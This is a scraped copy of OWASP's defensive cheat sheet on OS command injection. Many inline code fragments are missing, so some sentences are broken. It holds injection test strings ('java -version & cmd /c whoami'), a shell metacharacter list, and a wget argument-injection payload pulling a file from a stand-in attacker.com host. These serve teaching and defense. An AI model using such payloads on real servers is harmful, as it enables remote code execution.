@@ -1,0 +1,109 @@
+Source: https://cheatsheetseries.owasp.org/cheatsheets/OS_Command_Injection_Defense_Cheat_Sheet.html
+Scraped: 2025-12-22 20:47:59
+================================================================================
+
+OS Command Injection Defense - OWASP Cheat Sheet Series
+OS Command Injection Defense Cheat Sheet
+Command injection (or OS Command Injection) is a type of injection where software that constructs a system command using externally influenced input does not correctly neutralize the input from special elements that can modify the initially intended command.
+For example, if the supplied value is:
+when typed in a Windows command prompt, the application
+However, if the supplied value has been tampered with, and now it is:
+when executed, it changes the meaning of the initial intended value.
+application and the value
+The problem is exacerbated if the compromised process does not follow the principle of least privileges and attacker-controlled commands end up running with special system privileges that increase the amount of damage.
+Every OS Command Injection is also an Argument Injection. In this type of attacks, user input can be passed as arguments while executing a specific command.
+For example, if the user input is passed through an escape function to escape certain characters like
+system("curl " . escape($url));
+which will prevent an attacker to run other commands.
+However, if the attacker controlled string contains an additional argument of the
+system("curl " . escape("--help"))
+Now when the above code is executed, it will show the output of
+Depending upon the system command used, the impact of an Argument injection attack can range from
+Information Disclosure
+Remote Code Execution
+Defense Option 1: Avoid calling OS commands directly
+The primary defense is to avoid calling OS commands directly. Built-in library functions are a very good alternative to OS Commands, as they cannot be manipulated to perform tasks other than those it is intended to do.
+system("mkdir /dir_name")
+If there are available libraries or APIs for the language you use, this is the preferred method.
+Defense option 2: Escape values added to OS commands specific to each OS
+surrounds the user input in single quotes, so if the malformed user input is something like
+, the final output will be like
+calc '& echo "hello"'
+which will be parsed as a single argument to the command
+prevents OS Command Injection, an attacker can still pass a single argument to the command.
+Defense option 3: Parameterization in conjunction with Input Validation
+If calling a system command that incorporates user-supplied cannot be avoided, the following two layers of defense should be used within software to prevent attacks:
+If available, use structured mechanisms that automatically enforce the separation between data and command. These mechanisms can help provide the relevant quoting and encoding.
+The values for commands and the relevant arguments should be both validated. There are different degrees of validation for the actual command and its arguments:
+used, these must be validated against a list of allowed commands.
+used for these commands, they should be validated using the following options:
+Positive or allowlist input validation
+: Where are the arguments allowed explicitly defined.
+Allowlist Regular Expression
+: Where a list of good, allowed characters and the maximum length of the string are defined. Ensure that metacharacters like ones specified in
+and whitespaces are not part of the Regular Expression. For example, the following regular expression only allows lowercase letters and numbers and does not contain metacharacters. The length is also being limited to 3-10 characters:
+The first -- argument that is not an option-argument should be accepted as a delimiter indicating the end of options. Any following arguments should be treated as operands, even if they begin with the '-' character.
+will prevent an argument injection even if the
+is malformed and contains an additional argument.
+& |  ; $ > < ` \ ! ' " ( )
+On top of primary defenses, parameterizations, and input validation, we also recommend adopting all of these additional defenses to provide defense in depth.
+These additional defenses are:
+Applications should run using the lowest privileges that are required to accomplish the necessary tasks.
+If possible, create isolated accounts with limited privileges that are only used for a single task.
+and the command must be separated from its arguments.
+Note about the Java's
+There are many sites that will tell you that Java's
+is exactly the same as
+'s system function. This is not true. Both allow you to invoke a new program/process.
+'s system function passes its arguments to the shell (
+) to be parsed, whereas
+tries to split the string into an array of words, then executes the first word in the array with the rest of the words as parameters.
+does NOT try to invoke the shell at any point and does not support shell metacharacters
+The key difference is that much of the functionality provided by the shell that could be used for mischief (chaining commands using
+, etc,  redirecting input and output) would simply end up as a parameter being passed to the first command, likely causing a syntax error or being thrown out as an invalid parameter.
+Code to test the note above:
+"#### TEST CMD: %s\n"
+"#### TEST PAYLOAD ONLY: %s\n"
+##### TEST CMD: java -version & cmd /c whoami
+java version "1.8.0_31"
+##### TEST CMD: java -version && cmd /c whoami
+java version "1.8.0_31"
+##### TEST CMD: java -version | cmd /c whoami
+java version "1.8.0_31"
+##### TEST CMD: java -version || cmd /c whoami
+java version "1.8.0_31"
+##### TEST PAYLOAD ONLY: cmd /c whoami
+"C:\DoStuff.exe -arg1 -arg2"
+In this example, the command together with the arguments are passed as a one string, making it easy to manipulate that expression and inject malicious strings.
+Here is an example that starts a process with a modified working directory. The command and each of the arguments are passed separately. This makes it easy to validate each term and reduces the risk of malicious strings being inserted.
+See relevant details in the
+DotNet Security Cheat Sheet
+PHP exposes two helper functions when you must pass user input to a shell:
+:  Ensures the user can pass only one parameter to the command, cannot add extra parameters, and cannot execute a different command.
+: Ensures the user can execute only the intended command, can pass unlimited parameters, but cannot execute other commands.
+It is always preferable to use
+when dealing with user input.
+For example, consider this code using
+$command = 'wget --directory-prefix=..\temp ' . $url;
+system(escapeshellcmd($command));
+If the user provides:
+http://victim.com/download.php?url=--directory-prefix=. http://attacker.com/malicious.php
+will still allow this extra parameter meaning the attacker can override the original
+option, save the file in the current directory and then achieve remote command execution on the server.
+The safe approach is to use
+so that the URL is treated as a single argument:
+$command = 'wget --directory-prefix=..\temp ' . escapeshellarg($url);
+Now the malicious input becomes:
+wget --directory-prefix=..\temp '--directory-prefix=. http://attacker.com/malicious.php'
+is part of the quoted string, not a real option, so the attack fails.
+In addition, it is good security practice to follow these recommendations:
+: never allow the user to choose which executable to run.
+: required flags (e.g.,
+) should be in the code, not in user input.
+Validate and restrict input as much as possible
+: apply strict validation rules, whitelists, and format checks to minimize the attack surface.
+Description of Command Injection Vulnerability
+How to Avoid Vulnerabilities
+Reviewing Code for OS Injection
+Testing for Command Injection
+CWE Entry 77 on Command Injection
